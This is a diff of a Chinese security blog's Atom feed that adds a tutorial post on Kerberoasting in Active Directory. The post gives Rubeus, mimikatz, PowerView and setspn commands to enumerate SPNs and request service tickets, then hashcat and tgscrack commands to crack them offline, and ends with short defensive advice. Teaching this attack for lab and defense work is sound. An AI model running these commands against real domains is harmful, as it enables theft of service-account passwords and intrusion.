@@ -3,7 +3,90 @@
     <id>http://gyzero.shop</id>
     <title>云逸&#39;bolg</title>
     <link href="http://gyzero.shop" />
-    <updated>2024-03-09T07:47:33.000Z</updated>
+    <updated>2024-03-12T10:38:16.000Z</updated>
+    <entry>
+        <id>http://gyzero.shop/2024/03/12/network-security/neiwang/Kerberoasting%E6%94%BB%E5%87%BB/Kerberoasting%E6%94%BB%E5%87%BB/</id>
+        <title>Kerberoasting攻击</title>
+        <link rel="alternate" href="http://gyzero.shop/2024/03/12/network-security/neiwang/Kerberoasting%E6%94%BB%E5%87%BB/Kerberoasting%E6%94%BB%E5%87%BB/"/>
+        <content type="html">&lt;h3 id=&#34;spn&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#spn&#34;&gt;#&lt;/a&gt; SPN&lt;/h3&gt;
+&lt;p&gt;服务主体名称（Service Principal Name，简称 SPN）是服务实例的唯一标识符 Kerberos 身份验证使用 SPN 将服务实例与服务登录帐户相关联。这样，即使客户端没有帐户名称，客户端应用程序也能请求帐户的服务身份验证如果在计算机的整个目录林上安装多个服务实例，那么每个实例都必须有自己的 SPN&lt;/p&gt;
+&lt;p&gt;就是服务实例注册到域控中的一个标识，域控用 SPN 来表示是那个服务，一个账户可以有多个 SPN 但是一个 SPN 只能有一个账户&lt;/p&gt;
+&lt;p&gt;SPN 有两种，一是注册在 AD 上机器帐户 (Computers) 下，另一种注册在域用户帐户 (Users) 下。&lt;/p&gt;
+&lt;p&gt;当一个服务的权限为 Local System 或 Network Service，则 SPN 注册在机器帐户 (Computers) 下。&lt;br&gt;
+当一个服务的权限为一个域用户，则 SPN 注册在域用户帐户 (Users) 下。&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;setspn -X 查询重复的SPN
+setspn -Q */* 查看当前域内所有的SPN
+setspn -T yunyi.io -Q */* 查看指定域内所有的SPN
+setspn -D MSSQLvc/12server4.yunyi.io:1433 sqladmin 删除spn
+setspn -A MSSQLvc/12server4.yunyi.io:1433 sqladmin 注册一个spn,在12server上为sqladmin用户注册SPN服务
+
+MSSQLvc/12server4.yunyi.io:1433是你要注册的SPN 1433是服务端口，sqladmin是启动SQL Server实例服务的帐户的名称
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;kerberosast&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#kerberosast&#34;&gt;#&lt;/a&gt; Kerberosast&lt;/h3&gt;
+&lt;p&gt;Kerberosast 攻击利用了 TGS_REP 阶段在这个阶段 TGS 返回的 ST 是由服务账户 hash 加密的，我们获取到 ST 后如果服务账号密码简单&lt;/p&gt;
+&lt;p&gt;并且使用 RC4-HMAC_MD5 加密因为这个加密比较容易爆破，我们就可以对 ST 穷举获取到服务账号的明文密码&lt;/p&gt;
+&lt;p&gt;利用的过程为：&lt;/p&gt;
+&lt;p&gt;第一步找到 SPN 服务&lt;/p&gt;
+&lt;p&gt;第二步请求指定 SPN 的 ST 票据&lt;/p&gt;
+&lt;p&gt;第四步导出 ST&lt;/p&gt;
+&lt;p&gt;第五步爆破&lt;/p&gt;
+&lt;h3 id=&#34;发现spn&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#发现spn&#34;&gt;#&lt;/a&gt; 发现 SPN&lt;/h3&gt;
+&lt;h4 id=&#34;riskyspn&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#riskyspn&#34;&gt;#&lt;/a&gt; RiskySPN&lt;/h4&gt;
+&lt;p&gt;这款工具可以发现弱密码易受攻击的 SPN，自动去除 krbtgt 用户的 SPN 服务因为这个用户因为当前用户密码是随机的不固定的 128 位字符不可能爆破出来&lt;/p&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Import-Module&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;\RiskySPNs&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;psm1 &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Find-PotentiallyCrackableAccounts&lt;/span&gt; 搜索脆弱Spn找到脆弱的帐户&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Export-PotentiallyCrackableAccounts&lt;/span&gt; 产生全deatiled报告有关脆弱的帐户&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240314113846072.png&#34; alt=&#34;image-20240314113846072&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240314113916993.png&#34; alt=&#34;image-20240314113916993&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;kerberoast-getuserspns&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#kerberoast-getuserspns&#34;&gt;#&lt;/a&gt; kerberoast-GetUserSPNs&lt;/h4&gt;
+&lt;p&gt;kerberoast 工具集中的 GetUserSPNs.psl 和 GetUserSPNs.vbs 用于检测域中的 SPN&lt;/p&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Import-Module&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;\GetUserSPNs&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ps1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;cscript &lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;\GetUserSPNs&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;vbs&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240314113716199.png&#34; alt=&#34;image-20240314113716199&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240314114032106.png&#34; alt=&#34;image-20240314114032106&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;powerview&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#powerview&#34;&gt;#&lt;/a&gt; PowerView&lt;/h4&gt;
+&lt;p&gt;PowerSpolit 中的 PowerView.psl 脚本&lt;/p&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Import-Module&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;\PowerView&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ps1&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Get-NetUser&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;SPN&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240314114307071.png&#34; alt=&#34;image-20240314114307071&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;请求spn&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#请求spn&#34;&gt;#&lt;/a&gt; 请求 SPN&lt;/h3&gt;
+&lt;p&gt;查询过滤完就该去请求有价值的 SPN 了&lt;/p&gt;
+&lt;h4 id=&#34;rubeus请求spn&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rubeus请求spn&#34;&gt;#&lt;/a&gt; Rubeus 请求 spn&lt;/h4&gt;
+&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;Rubeus.exe kerberoast请求注册域用户下所有SPN
+Rubeus.exe kerberoast /format:john /outfile:hash.txt 请求后输出成hash
+Rubeus.exe kerberoast /spn:MSSQLSvc/12servser4.yunyi.io:1433 /format:john /outfile:hash2.txt 请求指定的spn并输出
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240314120835012.png&#34; alt=&#34;image-20240314120835012&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240314120745170.png&#34; alt=&#34;image-20240314120745170&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240314121407174.png&#34; alt=&#34;image-20240314121407174&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;mimikatz请求票据&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#mimikatz请求票据&#34;&gt;#&lt;/a&gt; mimikatz 请求票据&lt;/h4&gt;
+&lt;p&gt;&lt;code&gt;kerberos::ask /target:MSSQLSvc/12servser4.yunyi.io:1433&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240314121800096.png&#34; alt=&#34;image-20240314121800096&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;powershell-命令请求&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#powershell-命令请求&#34;&gt;#&lt;/a&gt; PowerShell 命令请求&lt;/h4&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Add-Type&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;AssemblyName System&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;IdentityModel 请求服务票据&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;klist列出服务票据&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240314122815556.png&#34; alt=&#34;image-20240314122815556&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;导出票据&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#导出票据&#34;&gt;#&lt;/a&gt; 导出票据&lt;/h3&gt;
+&lt;h4 id=&#34;mimikatz导出&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#mimikatz导出&#34;&gt;#&lt;/a&gt; mimikatz 导出&lt;/h4&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240314124524750.png&#34; alt=&#34;image-20240314124524750&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Rubeus 导出&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Rubeus.exe kerberoast /format:john /outfile:hash.txt 请求后输出成has&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240314125002731.png&#34; alt=&#34;image-20240314125002731&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;破解票据&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#破解票据&#34;&gt;#&lt;/a&gt; 破解票据&lt;/h3&gt;
+&lt;h4 id=&#34;hashcat破解&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hashcat破解&#34;&gt;#&lt;/a&gt; hashcat 破解&lt;/h4&gt;
+&lt;p&gt;将刚才 Rubeus 导出的 hash 拿到本地进行离线爆破&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;hashcat -m 13100 hash.txt pass.txt --force&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;hashcat hash.txt --show&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240314130022282.png&#34; alt=&#34;image-20240314130022282&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;tgscrack&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#tgscrack&#34;&gt;#&lt;/a&gt; tgscrack&lt;/h4&gt;
+&lt;p&gt;先用 extractServiceTicketParts.py 脚本对 mimikatz 导出来的票据进行转换&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;python2 extractServiceTicketParts.py MSSQLSvc\~12servser4.yunyi.io\~1433-YUNYI.IO.kirbi &amp;gt; hash2.txt&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240314131328670.png&#34; alt=&#34;image-20240314131328670&#34;&gt;&lt;/p&gt;
+&lt;p&gt;接着用 tgscrack.go 破解&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;go run tgscrack.go -hashfile hash2.txt -wordlist pass.txt&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240314131029438.png&#34; alt=&#34;image-20240314131029438&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;kerberoastpy&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#kerberoastpy&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2tlcmJlcm9hc3QucHk=&#34;&gt;kerberoast.py&lt;/span&gt;&lt;/h4&gt;
+&lt;p&gt;kerberoast 工具集里的脚本&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;https://github.com/nidem/kerberoast/blob/master/kerberoast.py&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;python2 kerberoast.py pass.txt MSSQLSvc\~12servser4.yunyi.io\~1433-YUNYI.IO.kirbi&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;kerberosast防御&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#kerberosast防御&#34;&gt;#&lt;/a&gt; Kerberosast 防御&lt;/h3&gt;
+&lt;p&gt;设置高强度密码定期修改密码&lt;/p&gt;
+&lt;p&gt;尽可能不要使用 RC4_HMAC 加密使用更安全的 AES256_HMAC 加密&lt;/p&gt;
+&lt;p&gt;给服务账号的权限尽量不要太高&lt;/p&gt;
+</content>
+        <updated>2024-03-12T10:38:16.000Z</updated>
+    </entry>
     <entry>
         <id>http://gyzero.shop/2024/03/09/network-security/neiwang/%E5%9F%9F%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92/%E5%9F%9F%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92/</id>
         <title>域用户枚举密码喷洒</title>
